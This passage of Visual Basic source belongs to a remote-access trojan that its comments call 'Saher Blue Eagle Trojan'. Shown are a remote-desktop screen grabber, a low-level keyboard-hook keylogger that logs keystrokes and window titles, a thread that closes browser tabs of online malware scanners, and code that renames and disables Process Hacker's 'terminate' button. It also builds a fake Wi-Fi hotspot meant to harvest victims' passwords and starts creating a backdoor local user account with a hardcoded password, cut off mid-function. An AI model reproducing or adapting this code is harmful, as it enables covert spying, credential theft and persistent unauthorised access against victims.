                Return B.GetThumbnailImage(Wi, He, Nothing, Nothing)
            End If
        End Function
        Private Shared Function md5(ByVal bB As Byte()) As String
            On Error Resume Next
            Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider
            bB = md5Obj.ComputeHash(bB)
            Return Convert.ToBase64String(bB)
        End Function
        Private Shared Function GetEncoderInfo(ByVal M As String) As ImageCodecInfo
            On Error Resume Next
            Dim j As Integer
            Dim encoders As ImageCodecInfo()
            encoders = ImageCodecInfo.GetImageEncoders()
            For j = 0 To encoders.Length
                If encoders(j).MimeType = M Then
                    Return encoders(j)
                End If
            Next j
            Return Nothing
        End Function
        Shared Sub Clear()
            On Error Resume Next
            oQ = -1
            oCo = -1
            oQu = -1
            OM = New Bitmap(1, 1)
        End Sub
        Private Shared oQ As Integer = 0
        Private Shared oCo As Integer = 0
        Private Shared oQu As Integer = 0
        Shared Function Cap(ByVal q As Integer, ByVal co As Integer, ByVal Qu As Integer) As Byte()
            On Error Resume Next
ee:
            Dim ZS As New Size(QZ(q))
            ZS.Width = Mid(ZS.Width.ToString, 1, ZS.Width.ToString.Length - 1) & 0
            ZS.Height = Mid(ZS.Height.ToString, 1, ZS.Height.ToString.Length - 1) & 0
            If OM.Size.Width <> ZS.Width Or OM.Height <> ZS.Height Or oCo <> co Or oQu <> Qu Then
                OA.Clear()
                OAA.Clear()
                OM = New Bitmap(ZS.Width, ZS.Height)
            End If
            oQ = q
            oCo = co
            oQu = Qu

            Dim A As New List(Of Bitmap)
            Dim AA As New List(Of Point)
            Dim m As Bitmap
            If OA.Count > 0 Then
                A.AddRange(OA.ToArray)
                OA.Clear()
                AA.AddRange(OAA.ToArray)
                OAA.Clear()

                m = OM
                GoTo e
            End If
            m = Gd(ZS.Width, ZS.Height)
            Dim w As Integer = ZS.Width
            Dim h As Integer = ZS.Height
            Dim K As Integer = 0
            For i As Integer = 0 To co - 1
                For ii As Integer = 0 To co - 1
                    Dim y As Integer = h / co * i
                    Dim x As Integer = w / co * ii
                    Dim wc As Integer = w / co
                    Dim hc As Integer = h / co
                    If wc.ToString.Contains(".") Then
                        wc = Split(wc, ".")(0)
                    End If
                    If hc.ToString.Contains(".") Then
                        hc = Split(hc, ".")(0)
                    End If
                    Dim MM As New IO.MemoryStream
                    Dim Mj = m.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                    Dim MJJ = OM.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                    Dim b1 As Byte()
                    Dim b2 As Byte()
                    Mj.Save(MM, Imaging.ImageFormat.Jpeg)
                    b1 = MM.ToArray
                    MM.Dispose()
                    MM = New IO.MemoryStream
                    MJJ.Save(MM, Imaging.ImageFormat.Jpeg)

                    b2 = MM.ToArray

                    MM.Dispose()
                    If md5(b1) = md5(b2) Then
                        Mj.Dispose()
                    Else
                        A.Add(Mj)
                        AA.Add(New Point(x, y))
                    End If
                    MJJ.Dispose()
nx:
                Next
            Next
e:

            If A.Count = 0 Then
                Return New Byte() {0}
            End If
            Dim hh As Integer = 0
            Dim QA As New List(Of Integer)
            For i As Integer = 0 To co * co / 5
                If i = A.Count Then Exit For
                QA.Add(i)
                hh += A(i).Height
            Next
            Dim xx As New Bitmap(A(0).Width, hh)
            Dim gg = Graphics.FromImage(xx)
            Dim tp As Integer = 0
            Dim s As String = m.Width & "." & m.Height & ","
            For Each i As Integer In QA
                s += AA(i).X & "." & AA(i).Y & "." & A(i).Height & ","
                gg.DrawImage(A(i), 0, tp)
                tp += A(i).Height
            Next
            s += "UOQ81HW728WJ28W92UW920"
            For i As Integer = 0 To A.Count - 1
                If QA.Contains(i) = False Then
                    OA.Add(A(i))
                    OAA.Add(AA(i))
                End If
            Next
            gg.Dispose()
            Dim JA = New IO.MemoryStream
            Dim eps As EncoderParameters = New EncoderParameters(1)
            eps.Param(0) = New EncoderParameter(Drawing.Imaging.Encoder.Quality, Qu)
            Dim ici As ImageCodecInfo = GetEncoderInfo("image/jpeg")
            xx.Save(JA, ici, eps)
            Dim J2 As New IO.MemoryStream
            J2.Write(System.Text.Encoding.Default.GetBytes(s), 0, s.Length)
            J2.Write(JA.ToArray, 0, JA.Length)
            OM = m
            xx.Dispose()
            Return J2.ToArray
        End Function
    End Class ''Fast_Screen
    Private Class Rmote_Desktop
        Private Shared OA As New List(Of Bitmap)
        Private Shared OAA As New List(Of Point)
        Private Shared OM As New Bitmap(1, 1) ' OLD IMAGE
        Private Shared Function QZ(ByVal q As Integer) As Size '  Lower size of image
            Dim zs As New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
            Select Case q
                Case 0
                    Return zs
                Case 1
                    zs.Width = zs.Width / 1.1
                    zs.Height = zs.Height / 1.1
                Case 2
                    zs.Width = zs.Width / 1.3
                    zs.Height = zs.Height / 1.3
                Case 3
                    zs.Width = zs.Width / 1.5
                    zs.Height = zs.Height / 1.5
                Case 4
                    zs.Width = zs.Width / 1.9
                    zs.Height = zs.Height / 1.9
                Case 5
                    zs.Width = zs.Width / 2
                    zs.Height = zs.Height / 2
                Case 6
                    zs.Width = zs.Width / 2.1
                    zs.Height = zs.Height / 2.1
                Case 7
                    zs.Width = zs.Width / 2.2
                    zs.Height = zs.Height / 2.2
                Case 8
                    zs.Width = zs.Width / 2.5
                    zs.Height = zs.Height / 2.5
                Case 9
                    zs.Width = zs.Width / 3
                    zs.Height = zs.Height / 3
                Case 10
                    zs.Width = zs.Width / 3.5
                    zs.Height = zs.Height / 3.5
                Case 11
                    zs.Width = zs.Width / 4
                    zs.Height = zs.Height / 4
                Case 12
                    zs.Width = zs.Width / 5
                    zs.Height = zs.Height / 5
                Case 13
                    zs.Width = zs.Width / 6
                    zs.Height = zs.Height / 6
            End Select
            zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
            zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
            Return zs
        End Function
        Private Shared Function Gd(Optional ByVal Wi As Integer = 0, Optional ByVal He As Integer = 0, Optional ByVal Sh As Boolean = True) As Image
            Dim W As Integer = Screen.PrimaryScreen.Bounds.Width
            Dim H As Integer = Screen.PrimaryScreen.Bounds.Height
            Dim B As New Bitmap(W, H)
            Dim g As Graphics = Graphics.FromImage(B)
            g.CompositingQuality = CompositingQuality.HighSpeed
            g.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
            If Sh Then
                Try
                    Cursors.Default.Draw(g, New Rectangle(Cursor.Position, New Size(32, 32)))
                Catch ex As Exception
                End Try
            End If
            g.Dispose()
            If Wi = 0 And He = 0 Then
                Return B
            Else
                Return B.GetThumbnailImage(Wi, He, Nothing, Nothing)
            End If
        End Function
        Private Shared Function md5(ByVal bB As Byte()) As String
            Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider
            bB = md5Obj.ComputeHash(bB)
            Return Convert.ToBase64String(bB)
        End Function
        Private Shared Function GetEncoderInfo(ByVal M As String) As ImageCodecInfo
            Dim j As Integer
            Dim encoders As ImageCodecInfo()
            encoders = ImageCodecInfo.GetImageEncoders()
            For j = 0 To encoders.Length
                If encoders(j).MimeType = M Then
                    Return encoders(j)
                End If
            Next j
            Return Nothing
        End Function
        Shared Sub Clear()
            oQ = -1
            oCo = -1
            oQu = -1
            OM = New Bitmap(1, 1)
        End Sub

        Private Shared oQ As Integer = 0
        Private Shared oCo As Integer = 0
        Private Shared oQu As Integer = 0
        Shared Function Cap(ByVal q As Integer, ByVal co As Integer, ByVal Qu As Integer) As Byte()
ee:
            Dim ZS As New Size(QZ(q))
            ZS.Width = Mid(ZS.Width.ToString, 1, ZS.Width.ToString.Length - 1) & 0
            ZS.Height = Mid(ZS.Height.ToString, 1, ZS.Height.ToString.Length - 1) & 0
            If OM.Size.Width <> ZS.Width Or OM.Height <> ZS.Height Or oCo <> co Or oQu <> Qu Then
                OA.Clear()
                OAA.Clear()
                OM = New Bitmap(ZS.Width, ZS.Height)
            End If
            oQ = q
            oCo = co
            oQu = Qu

            Dim A As New List(Of Bitmap)
            Dim AA As New List(Of Point)
            Dim m As Bitmap
            If OA.Count > 0 Then
                A.AddRange(OA.ToArray)
                OA.Clear()
                AA.AddRange(OAA.ToArray)
                OAA.Clear()

                m = OM
                GoTo e
            End If
            m = Gd(ZS.Width, ZS.Height)
            Dim w As Integer = ZS.Width
            Dim h As Integer = ZS.Height
            Dim K As Integer = 0
            For i As Integer = 0 To co - 1
                For ii As Integer = 0 To co - 1
                    Dim y As Integer = h / co * i
                    Dim x As Integer = w / co * ii
                    Dim wc As Integer = w / co
                    Dim hc As Integer = h / co
                    If wc.ToString.Contains(".") Then
                        wc = Split(wc, ".")(0)
                    End If
                    If hc.ToString.Contains(".") Then
                        hc = Split(hc, ".")(0)
                    End If
                    Dim MM As New IO.MemoryStream
                    Dim Mj = m.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                    Dim MJJ = OM.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                    Dim b1 As Byte()
                    Dim b2 As Byte()
                    Mj.Save(MM, Imaging.ImageFormat.Jpeg)
                    b1 = MM.ToArray
                    MM.Dispose()
                    MM = New IO.MemoryStream
                    MJJ.Save(MM, Imaging.ImageFormat.Jpeg)

                    b2 = MM.ToArray

                    MM.Dispose()
                    If md5(b1) = md5(b2) Then
                        Mj.Dispose()
                    Else
                        A.Add(Mj)
                        AA.Add(New Point(x, y))
                    End If
                    MJJ.Dispose()
nx:
                Next
            Next
e:

            If A.Count = 0 Then
                Return New Byte() {0}
            End If
            Dim hh As Integer = 0
            Dim QA As New List(Of Integer)
            For i As Integer = 0 To co * co / 5
                If i = A.Count Then Exit For
                QA.Add(i)
                hh += A(i).Height
            Next
            Dim xx As New Bitmap(A(0).Width, hh)
            Dim gg = Graphics.FromImage(xx)
            Dim tp As Integer = 0
            Dim s As String = m.Width & "." & m.Height & ","
            For Each i As Integer In QA
                s += AA(i).X & "." & AA(i).Y & "." & A(i).Height & ","
                gg.DrawImage(A(i), 0, tp)
                tp += A(i).Height
            Next
            s += "NsBl33D"
            For i As Integer = 0 To A.Count - 1
                If QA.Contains(i) = False Then
                    OA.Add(A(i))
                    OAA.Add(AA(i))
                End If
            Next
            gg.Dispose()
            Dim JA = New IO.MemoryStream
            Dim eps As EncoderParameters = New EncoderParameters(1)
            eps.Param(0) = New EncoderParameter(Drawing.Imaging.Encoder.Quality, Qu)
            Dim ici As ImageCodecInfo = GetEncoderInfo("image/jpeg")
            xx.Save(JA, ici, eps)
            Dim J2 As New IO.MemoryStream
            J2.Write(System.Text.Encoding.Default.GetBytes(s), 0, s.Length)
            J2.Write(JA.ToArray, 0, JA.Length)
            OM = m
            xx.Dispose()
            Return J2.ToArray
        End Function
    End Class ''Rmote_Desktop_Manager
#Region "anti_Online_Scanners"

    <DllImport("user32.dll", CallingConvention:=CallingConvention.StdCall, CharSet:=CharSet.Unicode, EntryPoint:="keybd_event", ExactSpelling:=True, SetLastError:=True)> _
    Public Function keybd_event(ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Int32, ByVal dwExtraInfo As Int32) As Boolean
    End Function
    <DllImport("PSAPI")> _
    Private Function EmptyWorkingSet(ByVal hProc As IntPtr) As IntPtr
    End Function
    Sub Block(ByVal sSite As String)
        Dim i As New Threading.Thread(AddressOf TS)
        i.Start(sSite)
    End Sub
    Sub TS(ByVal str As String)
        Do
            For Each x As Process In Process.GetProcessesByName("chrome")
                If LCase(x.MainWindowTitle).Contains(str) Then
                    Dim Control As Byte = &H11
                    Dim KEYUP As Byte = &H2
                    keybd_event(Control, 0, 0, 0)
                    keybd_event(Keys.W, 0, 0, 0)
                    keybd_event(Control, 0, KEYUP, 0)
                    keybd_event(Keys.W, 0, KEYUP, 0)
                End If
            Next
            For Each x As Process In Process.GetProcessesByName("firefox")
                If LCase(x.MainWindowTitle).Contains(str) Then
                    Dim Control As Byte = &H11
                    Dim KEYUP As Byte = &H2
                    keybd_event(Control, 0, 0, 0)
                    keybd_event(Keys.W, 0, 0, 0)
                    keybd_event(Control, 0, KEYUP, 0)
                    keybd_event(Keys.W, 0, KEYUP, 0)
                End If
            Next
            For Each x As Process In Process.GetProcessesByName("iexplore")
                If LCase(x.MainWindowTitle).Contains(str) Then
                    Dim Control As Byte = &H11
                    Dim KEYUP As Byte = &H2
                    keybd_event(Control, 0, 0, 0)
                    keybd_event(Keys.W, 0, 0, 0)
                    keybd_event(Control, 0, KEYUP, 0)
                    keybd_event(Keys.W, 0, KEYUP, 0)
                End If
            Next
            EmptyWorkingSet(-1)
            Threading.Thread.Sleep(400)
        Loop
    End Sub

#End Region '''Anti+Online+Scanner
#Region "Dark_Eagle_Keylogger"
    Public Class BlueLogger

        Public Logs As String = "" '<<<<<<<<<< you Read Logs By this 
        Public isRunning As Boolean = False
        Public MaxLength As Integer = 100 * 1024 ' Max Logs Size 100KB
        Private Stream As IO.StreamWriter
        Dim o = My.Computer.Clock.LocalTime

        Public LogsPath As String = IO.Path.GetTempPath & New IO.FileInfo(Application.ExecutablePath).Name & ".log"
        Public Sub Start()
            If isRunning = True Then Exit Sub
            Try
                Logs = IO.File.ReadAllText(LogsPath)
            Catch ex As Exception
            End Try
            Stream = IO.File.AppendText(LogsPath)
            Stream.AutoFlush = True
            HHookID = SetWindowsHookEx(WH_KEYBOARD_LL, KBDLLHookProcDelegate, System.Runtime.InteropServices.Marshal.GetHINSTANCE(Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
            Dim t As New Threading.Thread(AddressOf WRK, 1)
            t.Start()
        End Sub
        Private OFF As Boolean = False
        Public Sub Close(ByVal DeleteLogs As Boolean)
            OFF = True
            Do Until isRunning = False
                Threading.Thread.CurrentThread.Sleep(1)
            Loop
            If DeleteLogs = True Then
                Threading.Thread.CurrentThread.Sleep(1000)
                Try
                    IO.File.Delete(LogsPath)
                Catch ex As Exception
                End Try
                Logs = ""
            End If
            OFF = False
        End Sub
        Private LastAV As Integer ' Last Active Window Handle
        Private LastAS As String ' Last Active Window Title
        Private lastKey As Keys = Nothing
        Private Function AV() As String ' Get Active Window
            Try
                Dim o = GetForegroundWindow
                Dim id As Integer
                GetWindowThreadProcessId(o, id)
                Dim p As Process = Process.GetProcessById(id)
                If o.ToInt32 = LastAV And LastAS = p.MainWindowTitle Then
                    Return ""
                Else
                    LastAV = o.ToInt32
                    LastAS = p.MainWindowTitle
                    Return vbNewLine & vbNewLine & "[" & LastAS & "]" & HM() & vbNewLine
                End If
            Catch ex As Exception
                Return ""
            End Try
        End Function
        Private Function HM() As String
            Dim oo = My.Computer.Clock.LocalTime
            Return " " & oo.Day & "\" & oo.Month & "\" & oo.Year
        End Function
        Private Sub WRK()
            isRunning = True
            Try
                Do Until OFF = True
                    Threading.Thread.CurrentThread.Sleep(1)
                    For i As Integer = 0 To Isdown.Length - 1
                        If Isdown(i) Then
                            Isdown(i) = False
                            Dim s As String = AV() & Fix(i)
                            lastKey = i
                            Logs += s
                            Stream.Write(s)
                            If Logs.Length > MaxLength Then
                                Logs = Logs.Remove(0, Logs.Length - MaxLength)
                                Stream.Close()
                                Stream.Dispose()
                                IO.File.WriteAllText(LogsPath, Logs)
                                Stream = IO.File.AppendText(LogsPath)
                                Stream.AutoFlush = True
                            End If
                        End If
                    Next
                Loop
            Catch ex As Exception
            End Try
            Try
                Stream.Close()
            Catch ex As Exception
            End Try
            Try
                Stream.Dispose()
            Catch ex As Exception
            End Try
            isRunning = False
        End Sub
#Region "API"
        <DllImport("user32.dll")> _
        Private Shared Function ToUnicodeEx(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger, ByVal lpKeyState As Byte(), <Out(), MarshalAs(UnmanagedType.LPWStr)> ByVal pwszBuff As System.Text.StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger, _
  ByVal dwhkl As IntPtr) As Integer
        End Function
        <DllImport("user32.dll")> _
        Private Shared Function GetKeyboardState(ByVal lpKeyState As Byte()) As Boolean
        End Function
        <DllImport("user32.dll")> _
        Private Shared Function MapVirtualKey(ByVal uCode As UInteger, ByVal uMapType As UInteger) As UInteger
        End Function
        <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
        Private Overloads Shared Function SetWindowsHookEx(ByVal idHook As Integer, ByVal HookProc As KBDLLHookProc, ByVal hInstance As IntPtr, ByVal wParam As Integer) As Integer
        End Function
        <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
        Private Overloads Shared Function CallNextHookEx(ByVal idHook As Integer, ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
        End Function
        <DllImport("User32.dll", CharSet:=CharSet.Auto, CallingConvention:=CallingConvention.StdCall)> _
        Private Overloads Shared Function UnhookWindowsHookEx(ByVal idHook As Integer) As Boolean
        End Function
        Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
        Private Declare Function GetKeyboardLayout Lib "user32" (ByVal dwLayout As Integer) As Integer
        Private Declare Function GetForegroundWindow Lib "user32" () As IntPtr
#End Region
        Private Isdown(255) As Boolean
        Private Function Fix(ByVal k As Keys) As String
            Dim isuper As Boolean = My.Computer.Keyboard.ShiftKeyDown
            If My.Computer.Keyboard.CapsLock = True Then
                If isuper = True Then
                    isuper = False
                Else
                    isuper = True
                End If
            End If
            Try
                Select Case k
                    Case Keys.F1, Keys.F2, Keys.F3, Keys.F4, Keys.F5, Keys.F6, Keys.F7, Keys.F8, Keys.F9, Keys.F10, Keys.F11, Keys.F12, Keys.End, Keys.Delete, Keys.Back
                        Return "[" & k.ToString & "]"
                    Case Keys.LShiftKey, Keys.RShiftKey, Keys.Shift, Keys.ShiftKey, Keys.Control, Keys.ControlKey, Keys.RControlKey, Keys.LControlKey, Keys.Alt
                        Return ""
                    Case Keys.Space
                        Return " "
                    Case Keys.Enter, Keys.Return
                        If lastKey = k Then Return ""
                        Return "[ENTER]" & vbNewLine
                    Case Keys.Tab
                        If lastKey = k Then Return ""
                        Return "[TAP]" & vbNewLine
                    Case Else
                        If isuper = True Then
                            Return VKCodeToUnicode(k).ToUpper
                        Else
                            Return VKCodeToUnicode(k)
                        End If
                End Select
            Catch ex As Exception
                If isuper = True Then
                    Return ChrW(k).ToString.ToUpper
                Else
                    Return ChrW(k).ToString.ToLower
                End If
            End Try
        End Function
        Private Shared Function VKCodeToUnicode(ByVal VKCode As UInteger) As String
            Try
                Dim sbString As New System.Text.StringBuilder()
                Dim bKeyState As Byte() = New Byte(254) {}
                Dim bKeyStateStatus As Boolean = GetKeyboardState(bKeyState)
                If Not bKeyStateStatus Then
                    Return ""
                End If
                Dim lScanCode As UInteger = MapVirtualKey(VKCode, 0)
                Dim h As IntPtr = GetForegroundWindow()
                Dim id As Integer = 0
                Dim Aid As Integer = GetWindowThreadProcessId(h, id)
                Dim HKL As IntPtr = GetKeyboardLayout(Aid)
                ToUnicodeEx(VKCode, lScanCode, bKeyState, sbString, CInt(5), CUInt(0), _
                 HKL)
                Return sbString.ToString()
            Catch ex As Exception
            End Try
            Return CType(VKCode, Keys).ToString
        End Function
#Region "KeyHook"
        <StructLayout(LayoutKind.Sequential)> _
        Private Structure KBDLLHOOKSTRUCT
            Public vkCode As UInt32
            Public scanCode As UInt32
            Public flags As KBDLLHOOKSTRUCTFlags
            Public time As UInt32
            Public dwExtraInfo As UIntPtr
        End Structure
        <Flags()> _
        Private Enum KBDLLHOOKSTRUCTFlags As UInt32
            LLKHF_EXTENDED = &H1
            LLKHF_INJECTED = &H10
            LLKHF_ALTDOWN = &H20
            LLKHF_UP = &H80
        End Enum
        Private Const WH_KEYBOARD_LL As Integer = 13
        Private Const HC_ACTION As Integer = 0
        Private Const WM_SYSKEYDOWN = &H104
        Private Const WM_SYSKEYUP = &H105
        Private Delegate Function KBDLLHookProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
        Private KBDLLHookProcDelegate As KBDLLHookProc = New KBDLLHookProc(AddressOf KeyboardProc)
        Private HHookID As IntPtr = IntPtr.Zero
        Private Const WM_KEYDOWN = &H100
        Private Const WM_KEYUP = &H101
        Private Function KeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As Integer
            If (nCode = HC_ACTION) Then
                Dim struct As KBDLLHOOKSTRUCT
                Select Case wParam
                    Case WM_KEYDOWN, WM_SYSKEYDOWN
                        Dim k = (CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
                        Isdown(k) = True
                    Case WM_KEYUP, WM_SYSKEYUP
                        Dim k = (CType(CType(Marshal.PtrToStructure(lParam, struct.GetType()), KBDLLHOOKSTRUCT).vkCode, Keys))
                        Isdown(k) = False
                End Select
            End If
            Return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam)
        End Function
#End Region
    End Class
#End Region ''Advanced_key_Logger
#Region "Anti-ProcessHacker"
    Public Class WD
        Const GW_CHILD As Integer = 5
        Const GW_HWNDNEXT As Integer = 2
        Const WM_GETTEXT As Integer = &HD
        Const WM_GETTEXTLENGTH As Integer = &HE
        Const BM_SETSTATE As Integer = &HF3
        Const WM_LBUTTONUP As Integer = &H202
        Const WM_LBUTTONDOWN As Integer = &H201
        Public Declare Function FindWindowA Lib "user32.dll" (ByVal lpClassName As String, ByVal lpWindowName As String) As IntPtr
        Private Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" (ByVal hWnd1 As Long, ByVal hWnd2 As Long, ByVal lpsz1 As String, ByVal lpsz2 As String) As Long
        Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
        Public Declare Function IsWindowVisible Lib "user32" (ByVal hWnd As Long) As Integer
        Public Declare Auto Function SendMessage Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal msg As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
        Public Shared Sub CLK(ByVal hwnd As IntPtr)
            SendMessage(hwnd, WM_LBUTTONDOWN, 0, 0)
            SendMessage(hwnd, WM_LBUTTONUP, 0, 0)
        End Sub
        Declare Auto Function SetWindowText Lib "user32" (ByVal hWnd As IntPtr, ByVal lpstring As String) As Boolean

        Declare Function hh Lib "user32.dll" Alias "SendMessageA" (ByVal hWnd As IntPtr, ByVal msg As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
        Public Declare Function EnableWindow Lib "user32.dll" (ByVal hwnd As Int32, ByVal fEnable As Int32) As Int32
        Public Shared Function GetWindow(ByVal hwnd As IntPtr, ByVal uCmd As Integer) As IntPtr
        End Function
        Friend Declare Auto Function GetWindowText Lib "user32.dll" (ByVal hwnd As Int32, ByVal lpString As System.Text.StringBuilder, ByVal cch As Int32) As Int32
        Friend Declare Auto Function GetWindowTextLength Lib "user32.dll" (ByVal hwnd As Int32) As Int32
        Friend Declare Auto Function GetParent Lib "user32.dll" (ByVal hwnd As Int32) As Int32
        Public Shared Function WindowText(ByVal hWnd As Int32) As String

            If hWnd = 0 Then Return ""
            Dim text_len As Integer = GetWindowTextLength(hWnd)
            If text_len = 0 Then Return ""
            Dim sb As New System.Text.StringBuilder(text_len + 1)
            Dim ret = GetWindowText(hWnd, sb, sb.Capacity)
            If ret = 0 Then Return ""
            Return sb.ToString
        End Function
        Public Shared Function WindowToProcessId(ByVal hWnd As Long) As Long
            Dim lpProc As Long
            Call GetWindowThreadProcessId(hWnd, lpProc)
            Return lpProc
        End Function
        Public Shared Function FindWindow(ByVal ClassName As String, ByVal Title As String) As Wind
            Dim j As IntPtr = FindWindowA(ClassName, Title)
            If j.ToInt32 = 0 Then
                Return Nothing
            Else
                Return New Wind(j)
            End If
        End Function
    End Class
    Public Class Wind ' Window Class
        Sub New(ByRef Handle As IntPtr)
            HWD = Handle
        End Sub
        Public HWD As IntPtr
        Public Function Title() As String
            Return WD.WindowText(HWD)
        End Function
        Public Function Child() As Child() ' Get All Childs
            CLD.Clear()
            Dim proc As New EnumWindProc(AddressOf EnumChild), i As Int32
            EnumChildWindows(HWD, proc, IntPtr.Zero)
            Return CLD.ToArray
        End Function
        Delegate Function EnumWindProc( _
      ByVal hWnd As Int32, _
      ByVal lParam As Int32) As Boolean
        Delegate Function EnumChildWindProc( _
        ByVal hWnd As Int32, _
        ByVal lParam As Int32) As Boolean
        Declare Function EnumChildWindows Lib "user32" ( _
      ByVal hWnd As IntPtr, _
      ByVal lpEnumFunc As EnumWindProc, _
      ByRef lParam As IntPtr) As Int32
        Dim CLD As New List(Of Child)
        Private Function EnumChild( _
      ByVal hWnd As Int32, _
      ByVal lParam As Int32) As Boolean
            CLD.Add(New Child(hWnd))
            EnumChild = True

        End Function
    End Class
    Public Class Child ' Child Class
        Const WM_GETTEXTLENGTH As Integer = &HE
        Const WM_GETTEXT As Integer = &HD
        Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Integer, ByVal lpClassName As String, ByVal nMaxCount As Integer) As Integer
        Function Cname() As String
            Dim lret As Integer
            Dim aClass As String
            aClass = Space(128)
            lret = GetClassName(HWD, aClass, 128)
            aClass = Microsoft.VisualBasic.Left(aClass, lret)
            Return aClass
        End Function
        Function TEXT() As String
            Dim Handle As IntPtr = Marshal.AllocHGlobal(100)
            Dim tx As String = Marshal.PtrToStringUni(Handle)
            Dim Hndl As IntPtr = Marshal.AllocHGlobal(200)
            WD.SendMessage(HWD, WM_GETTEXT, 200, Hndl)
            tx = Marshal.PtrToStringUni(Hndl)
            Return tx
        End Function
        Sub New(ByVal handle As IntPtr)
            HWD = handle
        End Sub
        Public HWD As IntPtr

    End Class
    Public Class prote
        Private WithEvents t1 As New Windows.Forms.Timer
        Sub pass()
            t1.Start()
        End Sub
        Private Sub p() Handles t1.Tick
            While True
                Dim Wi As Wind = WD.FindWindow(Nothing, "Process Hacker")
                If Wi Is Nothing Then

                    Exit Sub

                End If
                Dim sh As String() = {"terminate"}

                Try
                    If WD.IsWindowVisible(Wi.HWD) Then
                        WD.SetWindowText(Wi.HWD, "Saher Blue Eagle Trojan Process Rootkit")

                        For i As Integer = 0 To sh.Length - 1
                            For Each X As Child In Wi.Child


                                If X.TEXT.ToLower = sh(i) Then
                                    WD.SetWindowText(X.HWD, "~*Blue_Eagle*~")


                                    WD.EnableWindow(X.HWD, False)

                                End If
                            Next
                        Next
                    End If
                Catch ex As Exception
                End Try
                Threading.Thread.Sleep(200)
            End While
        End Sub

    End Class

#End Region ''Anti_Terminator_Process_Hacker
#Region "Hotspot_Creator_<Fake Access Point>"

    'Coded By Saher Blue Eagle 1st Credit
    Dim InConnection As Boolean = False
    Dim Requests As New ListBox 'Results Database
    Dim Packets As New ListBox 'packets Database

    Private Sub Hotspot(ByVal SSID As String, ByVal password As String, ByVal status As Boolean)
        Dim processStartInfo As New ProcessStartInfo("cmd.exe")
        processStartInfo.RedirectStandardInput = True
        processStartInfo.RedirectStandardOutput = True
        processStartInfo.CreateNoWindow = True
        processStartInfo.UseShellExecute = False
        Dim process As Process = process.Start(processStartInfo)
        If (process IsNot Nothing) Then
            If (status) Then
                process.StandardInput.WriteLine("netsh wlan set hostednetwork mode=allow ssid=" + SSID + " key=" + password)
                process.StandardInput.WriteLine("netsh wlan start hosted network")
                process.StandardInput.Close()
            Else
                process.StandardInput.WriteLine("netsh wlan stop hostednetwork")
                process.StandardInput.Close()
            End If
        End If
        hotspotdone()
    End Sub 'Create the hotspot //Helper Method
    Sub CreateHotspot(ByVal SSID As String, ByVal Password As String) 'The Main Caller Method
        If (InConnection = False) Then
            If (String.IsNullOrEmpty(SSID)) Then 'Will Exit silently if input SSID is Null
                Exit Sub
            Else
                If (String.IsNullOrEmpty(Password)) Then 'Will Exit silently if input Password is Null
                    Exit Sub
                Else
                    If (Password.Length >= 8) Then 'Will Exit silently if input Password is Null
                        'Start The Creation Here
                        Hotspot(SSID, Password, True)
                        InConnection = True
                        hotspotdone()
                        'Starts the Hunter
                        Requests.Items.Add(Convert_Packets(Packet_Hunter))
                    End If
                End If
            End If
        End If
    End Sub
    Private Function Packet_Hunter() As String

    End Function 'Hunts another Victim requests & passwords  connected to Victim Laptop
    Private Function Convert_Packets(ByVal packet As String) As String

    End Function
    Sub stophotspot()
        Dim processStartInfo As New ProcessStartInfo("cmd.exe")
        processStartInfo.RedirectStandardInput = True
        processStartInfo.RedirectStandardOutput = True
        processStartInfo.CreateNoWindow = True
        processStartInfo.UseShellExecute = False
        Dim process As Process = process.Start(processStartInfo)
        process.StandardInput.WriteLine("netsh wlan stop hostednetwork")
        process.StandardInput.Close()
        hotspotoff()
    End Sub


#End Region ''Fake_Access_Point[Wifi]
#Region "Converting Vicrus to Message Text"
    Public [me] As String = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName)
#End Region
    Public Function chkIt() As Boolean
        Dim regstr As String = DirectCast(Registry.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Universal", "Universal", "Universal"), String)
        If regstr = "Universal" Then
            Return True 'Skip True 
        Else ' Dim newkey As RegistryKey = key.CreateSubKey("Universal", RegistryKeyPermissionCheck.Default = 1)
            'newkey.SetValue("Universal", [me])
            Return False
        End If
    End Function
    Public Sub UniversalUser()
        Try
            Dim ad As New DirectoryEntry("WinNT://" & Environment.MachineName & ",computer")
            Dim usr As DirectoryEntry = ad.Children.Add("Universal", "user")
            usr.Invoke("SetPassword", New Object() {"Universalwashere"})
